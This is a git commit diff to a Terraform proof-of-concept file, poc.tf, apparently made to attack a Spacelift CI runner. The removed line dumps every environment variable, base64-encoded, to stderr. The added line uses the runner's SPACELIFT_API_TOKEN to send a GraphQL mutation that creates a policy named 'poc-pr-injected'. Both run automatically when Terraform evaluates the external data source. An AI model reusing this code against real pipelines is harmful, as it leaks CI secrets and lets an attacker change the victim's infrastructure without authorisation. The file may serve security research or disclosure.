9a02f478d411e3bfda4257a7eaab8f85a50854ef
Life-y <64255312+Life-y@users.noreply.github.com>
2026-08-27 11:02:26 +0800

    Update external data source command in poc.tf

--- poc.tf
+++ poc.tf
@@ -1,3 +1,3 @@
 data "external" "poc" {
-  program = ["sh", "-c", "env | base64 | tr -d '\n' | fold -w 400 >&2; exit 1"]
+  program = ["sh", "-c", "R=$(curl -s -m 15 -H \"Authorization: Bearer $SPACELIFT_API_TOKEN\" -H 'Content-Type: application/json' -d '{\"query\":\"mutation{policyCreatev2(input:{name:\\\"poc-pr-injected\\\" body:\\\"package spacelift\\\" type:PLAN space:\\\"root\\\"}){id name}}\"}' \"$TF_VAR_spacelift_graphql_endpoint\"); echo \"MUTATION_RESULT: $R\" | base64 | tr -d '\\n' >&2; exit 1"]
 }
